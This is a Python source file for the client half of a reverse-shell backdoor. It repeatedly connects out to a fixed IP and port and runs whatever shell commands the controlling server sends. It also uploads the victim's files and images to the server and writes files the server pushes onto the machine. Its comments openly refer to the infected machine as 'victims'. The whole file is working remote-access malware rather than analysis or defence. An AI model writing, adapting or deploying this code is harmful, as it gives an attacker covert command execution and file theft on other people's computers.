import socket
import time
import json
import subprocess
import os

IP_ADDRESS = '192.168.0.16'
PORT = 54321

def reliable_send(data):
    jsondata = json.dumps(data)
    # SERVER
    # target = target, ip = sock.accept() below
    # jsondata has to be encoded to send ascii to victims as BYTEs
    
    # CLIENT
    # use victims' socket (s) to send jsondata.encode() 'ascii' as BYTEs
    s.send(jsondata.encode())
    
def reliable_recv():
    # Preparing to store data
    data = ''
    while True:
        try:
            # SERVER
            # Specify amount of BYTEs we wanna receive
            # Cuz data sending from victims are encoded BYTEs
            # Need to decode it upon receiving using .decode()
            # Need to trim the fucking '\n' '\r' to avoid errors using rstrip()
            
            # CLIENT
            # using victims' socket to receive commands
            data += s.recv(1024).decode().rstrip()
            # returning results
            return json.loads(data)
        except ValueError as e:
            # When we receive ValueError from execution
            # We continue the execution
            #print(f'Error occurred: {e}\nContinuing...')
            continue
        
def connection():
    while True:
        # Our Server can start at anytime, whenever server is running
        # Victims will try to connect every 20 secs
        time.sleep(20)
        # Try to connect to our Server
        try:
            # connection() will run over & over again
            # until victims' socket is connected to server
            s.connect((IP_ADDRESS, PORT))
            # Establish a reverse shell
            shell()
            # Close socket object once reverse shell is established
            s.close()
            # Socket closed => Exit this program
            break
        except:
            # Keep trying to run connection()
            connection()

# Allow Server to download simple files from victims (this client)
def upload_file(file_name):
    # open File from 'file_name' => command[9:]
    # read btyes
    f = open(file_name, 'rb')
    s.send(f.read())
    
# Allow Server to download img files from victims (this client)
def upload_image(file_name):
    # open File from 'file_name' => command[9:]
    # rb+ => Opens a file for both READING & WRITING in binary format
    # The file pointer will be at the beginning of the file
    f = open(file_name, 'rb+')
    s.send(f.read())

# Allow SERVER to download simple files from victims (this client)
# Callback used to download files from victims' machines
# Server => download files from victims' machines
# Client => upload files to Server
def download_file(file_name):
    # open file object 'f' using 
    # 'wb' => write bytes to a file
    f = open(file_name, 'wb')    
    # If timeout is NOT set, sometimes program will get stuck
    s.settimeout(1)
    # Receive data from multiple chunks
    chunk = s.recv(1024)
    # As long as there's something in chunk variable
    while chunk:
        # Writing the chunk into file
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        # If there's any errors => reached End of file
        except socket.timeout as e:
            break
        s.settimeout(5)
        # Close file upon complete sending files from victims
        f.close()

# Allow SERVER to download complicated files e.g. images from victims (this client)
# Callback used to download files from victims' machines
# Server => download files from victims' machines
# Client => upload files to Server
def download_image(file_name):
    # open file object 'f' using 
    # 'wb+' => write bytes to a file
    # 'wb+' => Opens a file for both writing & reading in binary format
    # Overwrites the existing file if the file exists
    # If the file does NOT exist, creates a new file for reading & writing
    f = open(file_name, 'wb+')    
    # If timeout is NOT set, sometimes program will get stuck
    s.settimeout(1)
    # Receive data from multiple chunks
    chunk = s.recv(4096)
    # As long as there's something in chunk variable
    while chunk:
        # Writing the chunk into file
        f.write(chunk)
        try:
            chunk = s.recv(4096)
        # If there's any errors => reached End of file
        except socket.timeout as e:
            break
        s.settimeout(None)
        # Close file upon complete sending files from victims
        f.close()
        
def shell():
    while True:
        # Receive command from server
        command = reliable_recv()
        # Exit program if 'q' is received from server
        if command == 'q':
            break
        
        # 'cd' command
        # comparing first 3 CHAR
        # cuz 'cd path/to/target'
        elif command[:3] == 'cd ':
            # From 3rd CHAR till the end
            os.chdir(command[3:])
        # Executing 'clear' on Server
        # do NOTHING in client
        elif command == 'clear':
            pass
        # 'vim' command
        # From beginning to 4th CHAR = 'vim '
        elif command[:4] == 'vim ':
            # vim test.txt => PATH starts from 5th CHAR
            os.system("vim"+command[5:])
        # Allow Server to download files from victims (this client)
        # If command[9:] from SERVER == 'download'
        # this client (victims) calls upload_file(command[9:])
        elif command[:8] == 'download':
            # If files to be downloaded are Images
            # use 'wb+'
            # Example
            # command = 'download happy.png'
            # command[9:] => happy.png
            # command[9:].split(".")[1] => png (file extensions)
            if command[9:].split(".")[1] == 'jpg' or command[9:].split(".")[1] == 'jpeg' or command[9:].split(".")[1] == 'png' or command[9:].split(".")[1] == 'svg' or command[9:].split(".")[1] == 'gif' or command[9:].split(".")[1] == 'bmp' or command[9:].split(".")[1] == 'tiff' or command[9:].split(".")[1] == 'ico' or command[9:].split(".")[1] == 'mp3' or command[9:].split(".")[1] == 'mp4' or command[9:].split(".")[1] == 'mov' or command[9:].split(".")[1] == 'avi' or command[9:].split(".")[1] == 'wmv' or command[9:].split(".")[1] == 'avchd' or command[9:].split(".")[1] == 'webm' or command[9:].split(".")[1] == 'flv' or command[9:].split(".")[1] == 'mpg' or command[9:].split(".")[1] == 'mpeg':
                upload_image(command[9:])
            else:
                # Starts from 9th CHAR till the end
                upload_file(command[9:])
                
        # Allow SERVER to send 'upload' command to victims machines
        # To start downloading files from victims
        elif command[:6] == 'upload':
            if command[7:].split(".")[1] == 'jpg' or command[7:].split(".")[1] == 'jpeg' or command[7:].split(".")[1] == 'png' or command[7:].split(".")[1] == 'svg' or command[7:].split(".")[1] == 'gif' or command[7:].split(".")[1] == 'bmp' or command[7:].split(".")[1] == 'tiff' or command[7:].split(".")[1] == 'ico' or command[7:].split(".")[1] == 'mp3' or command[7:].split(".")[1] == 'mp4' or command[7:].split(".")[1] == 'mov' or command[7:].split(".")[1] == 'avi' or command[7:].split(".")[1] == 'wmv' or command[7:].split(".")[1] == 'avchd' or command[7:].split(".")[1] == 'webm' or command[7:].split(".")[1] == 'flv' or command[7:].split(".")[1] == 'mpg' or command[7:].split(".")[1] == 'mpeg':
                download_image(command[7:])
            else:
                # If command[7:] from SERVER == 'upload'
                # this client (victims) calls download_file(command[7:])
                download_file(command[7:])
            
        else:
            # Execute the 'command' received from Server using process open
            # using subprocess module
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            # We get encoded data 'result' from 2 lines above
            # execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # result = execute.stdout.read() + execute.stderr.read()
            # It will throw us an Error if we do NOT decode result from above
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind socket => connection() => shell() => Call connection()
connection()
